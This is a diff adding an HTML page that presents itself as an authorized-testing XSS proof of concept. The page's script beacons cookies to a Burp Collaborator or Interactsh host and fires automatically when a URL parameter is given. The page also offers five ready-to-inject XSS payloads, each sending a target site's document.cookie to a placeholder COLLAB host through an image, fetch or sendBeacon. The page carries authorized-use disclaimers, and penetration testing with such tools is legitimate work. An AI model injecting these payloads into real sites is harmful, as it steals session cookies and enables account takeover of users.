@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cookie-exfil XSS PoC · x8bitranjit</title>
+<meta name="description" content="Authorized-testing PoC: beacon document.cookie of THIS origin to your Burp Collaborator / Interactsh, and the injection payloads for a real XSS.">
+<style>
+  :root{ --bg:#0b0f14; --panel:#111823; --border:#243040; --text:#e6edf3; --muted:#8b949e; --accent:#7ee787; --accent2:#58a6ff; --warn:#f0883e; }
+  *{ box-sizing:border-box; }
+  body{ margin:0; background:radial-gradient(1200px 600px at 50% -10%, #16202e 0%, var(--bg) 60%); color:var(--text);
+        font:16px/1.65 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; min-height:100vh; }
+  .wrap{ max-width:820px; margin:0 auto; padding:56px 20px 48px; }
+  .mono{ font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
+  a.back{ color:var(--muted); text-decoration:none; font-size:.85rem; }
+  a.back:hover{ color:var(--accent2); }
+  h1{ font-size:1.7rem; margin:14px 0 6px; }
+  h1 .tag{ color:var(--accent); }
+  .sub{ color:var(--muted); margin:0 0 24px; font-size:.92rem; }
+  h2{ font-size:1.05rem; margin:28px 0 10px; color:var(--accent2); }
+  p{ color:#cdd6e0; }
+  pre{ background:#0d1622; border:1px solid var(--border); border-radius:10px; padding:14px 16px; overflow-x:auto;
+       font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.85rem; color:#e6edf3; white-space:pre-wrap; word-break:break-all; }
+  code{ font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
+  .status{ padding:14px 16px; border-radius:10px; border:1px solid var(--border); background:#0e1622; margin:6px 0 4px; font-size:.9rem; }
+  .ok{ border-color:var(--accent); color:var(--accent); }
+  .warn{ border-color:var(--warn); color:var(--warn); }
+  .field{ display:flex; gap:8px; margin:10px 0 4px; flex-wrap:wrap; }
+  input{ flex:1; min-width:220px; background:#0d1622; border:1px solid var(--border); border-radius:8px; padding:9px 12px; color:var(--text);
+         font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.85rem; }
+  button{ background:var(--accent2); color:#04121f; border:0; border-radius:8px; padding:9px 16px; font-weight:600; cursor:pointer; }
+  .note{ margin-top:30px; padding:14px 16px; border-left:3px solid var(--warn); background:#1a1410; border-radius:0 10px 10px 0;
+         color:var(--muted); font-size:.85rem; }
+  footer{ margin-top:34px; padding-top:18px; border-top:1px solid var(--border); color:var(--muted); font-size:.82rem; }
+  .accent{ color:var(--accent); }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <a class="back mono" href="./index.html">&larr; back to the lab</a>
+    <h1 class="mono">Cookie-exfil XSS — <span class="tag">Collaborator beacon</span></h1>
+    <p class="sub">Confirms your out-of-band channel by beaconing <strong>this origin's</strong> <code>document.cookie</code> to your
+       Burp Collaborator / Interactsh. Same-origin policy means this only reads <code>x8bitranjit.github.io</code>'s own
+       (non-<code>HttpOnly</code>) cookies — for real impact, inject the payloads below into the target you are authorized to test.</p>
+
+    <h2>1) Point it at your Collaborator</h2>
+    <p class="sub">Add <code>?c=YOURSUBDOMAIN.oastify.com</code> to this page's URL, or type it and fire:</p>
+    <div class="field">
+      <input id="collab" class="mono" placeholder="e.g. abc123xyz.oastify.com  (or *.oast.fun / *.burpcollaborator.net / *.interact.sh)">
+      <button id="go">Beacon now</button>
+    </div>
+    <div id="status" class="status mono">idle — no Collaborator host set.</div>
+
+    <h2>2) Injection payloads (drop into the vulnerable field on YOUR authorized target)</h2>
+    <p class="sub">Replace <code>COLLAB</code> with your Collaborator subdomain. Run in the <em>target's</em> origin, they exfil the <em>target's</em> cookies.</p>
+    <pre id="payloads">&lt;script&gt;new Image().src='//COLLAB/x8bit?c='+encodeURIComponent(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="new Image().src='//COLLAB/x8bit?c='+encodeURIComponent(document.cookie)"&gt;
+&lt;svg onload="fetch('//COLLAB/x8bit?c='+encodeURIComponent(document.cookie))"&gt;
+&lt;script&gt;navigator.sendBeacon('//COLLAB/x8bit',document.cookie)&lt;/script&gt;
+&lt;script&gt;fetch('//COLLAB/x8bit',{method:'POST',body:document.cookie,mode:'no-cors'})&lt;/script&gt;</pre>
+
+    <div class="note">
+      <strong>Authorized testing only.</strong> This page beacons <em>its own</em> origin's cookies to an OOB host you supply
+      (restricted to Collaborator/Interactsh domains) and prints exactly what it sent — it is a transparent PoC, not a covert stealer.
+      Use the injection payloads only against systems you have written permission to test.
+    </div>
+
+    <footer class="mono">x8bitranjit · <a class="accent" href="./index.html" style="text-decoration:none">XSS PoC Lab</a></footer>
+  </div>
+
+  <script>
+    // Only OOB providers (Burp Collaborator / Interactsh) are accepted — keeps this from becoming a generic beacon.
+    var OOB = /^[a-z0-9][a-z0-9-]*\.(oastify\.com|oast\.(fun|live|site|online|pro)|burpcollaborator\.net|interact\.sh)$/i;
+    var statusEl = document.getElementById('status');
+    var input = document.getElementById('collab');
+
+    function setStatus(msg, cls){ statusEl.textContent = msg; statusEl.className = 'status mono' + (cls ? ' ' + cls : ''); }
+
+    function beacon(host){
+      if(!OOB.test(host)){
+        setStatus('refused — "' + host + '" is not a Collaborator/Interactsh host (*.oastify.com, *.oast.fun, *.burpcollaborator.net, *.interact.sh).', 'warn');
+        return;
+      }
+      var c = document.cookie;                                   // THIS origin's cookies only (no HttpOnly)
+      var url = 'https://' + host + '/x8bit-cookie-poc?c=' + encodeURIComponent(c) +
+                '&u=' + encodeURIComponent(location.href) + '&r=' + encodeURIComponent(document.referrer);
+      new Image().src = url;                                     // GET beacon — no CORS needed
+      var shown = c ? c : '(empty — github.io sets no readable cookies; the beacon still fired, check Collaborator)';
+      setStatus('beaconed to ' + host + '  ✓\ncookie = ' + shown, 'ok');
+    }
+
+    document.getElementById('go').onclick = function(){ beacon(input.value.trim()); };
+    // auto-fire if ?c= is present, so a single clicked URL proves the channel
+    var m = new URLSearchParams(location.search).get('c');
+    if(m){ input.value = m; beacon(m.trim()); }
+  </script>
+</body>
+</html>
